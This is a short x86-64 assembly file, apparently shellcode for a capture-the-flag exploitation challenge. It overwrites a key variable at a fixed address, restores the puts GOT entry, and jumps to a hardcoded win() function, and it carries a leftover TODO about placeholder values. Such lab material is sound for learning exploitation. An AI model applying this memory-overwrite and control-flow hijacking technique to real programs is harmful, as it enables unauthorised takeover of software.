BITS 64

SECTION .text
global main

main:
    ; TODO: replace <val1>..<val5> with appropriate addresses
    mov dword [0x404034], 0x5924  ; set key to the correct value 
    mov qword [0x404018], 0x401036  ; restore the GOT entry for puts
    push rbx                    ;
    mov rbx, 0x401126             ; address of win() function 
    call rbx                    ; call the win() function
    pop rbx                     ; 
    ret

